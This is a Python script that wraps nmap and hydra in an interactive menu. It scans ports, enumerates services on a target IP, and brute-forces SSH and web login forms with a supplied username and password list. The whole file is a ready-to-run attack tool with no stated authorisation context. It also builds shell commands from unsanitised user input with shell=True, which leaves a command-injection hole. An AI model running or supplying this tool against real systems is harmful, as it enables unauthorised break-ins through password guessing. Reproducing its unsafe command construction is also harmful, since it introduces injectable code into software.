import os
import subprocess
import re


def validate_ip(ip):

    pattern = re.compile(
        r"\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
    return bool(pattern.match(ip))



def file_exists(file_path):
    return os.path.isfile(file_path)



def run_command(command):
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        while process.poll() is None:
            output = process.stdout.readline().strip()
            if output:
                print(output)
        _, stderr = process.communicate()
        if stderr:
            print(stderr.strip())
    except Exception as e:
        print(f"An error occurred: {e}")


    
def scan_ports(target):
    print(f"Scanning ports on {target}...")
    command = f"nmap -Pn {target}"
    run_command(command)



def enumerate_services(target):
    print(f"Enumerating services on {target}...")
    command = f"nmap -sV {target}"
    run_command(command)

    

def brute_force(target, user, pass_list):
    print(f"Running brute force attack on {target}...")
    command = f"hydra -l {user} -P {pass_list} {target} ssh"
    run_command(command)



def brute_force_web_form(target, form_parameters, user, pass_list):
    print(f"Running brute force attack on web form at {target}...")
    command = f"hydra -l {user} -P {pass_list} {target} http-post-form \"{form_parameters}\""
    run_command(command)



def main():
    try:
       
        target = input("Enter the IP: ")
        if not validate_ip(target):
            print("Invalid IP address. Exiting...")
            return

        user = input("Enter the username: ")
        pass_list = input("Enter the password list: ")
        if not file_exists(pass_list):
            print("Password file does not exist. Exiting...")
            return

        while True:
           
            print("\nAvailable functions:")
            print("1. Scan ports")
            print("2. Enumerate services")
            print("3. Brute force SSH")
            print("4. Brute force web form")
            print("Enter the numbers of the functions you want to execute (comma-separated), or enter 'exit' to quit:")
            function_choices = input()

            if function_choices.lower() == 'exit':
                break

            
            choices = [choice.strip() for choice in function_choices.split(',')]

           
            if '1' in choices:
                scan_ports(target)
            if '2' in choices:
                enumerate_services(target)
            if '3' in choices:
                brute_force(target, user, pass_list)
            if '4' in choices:
                form_parameters = input("Enter the web form parameters: ")
                brute_force_web_form(target, form_parameters, user, pass_list)
        
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")

        

if __name__ == "__main__":
    main()

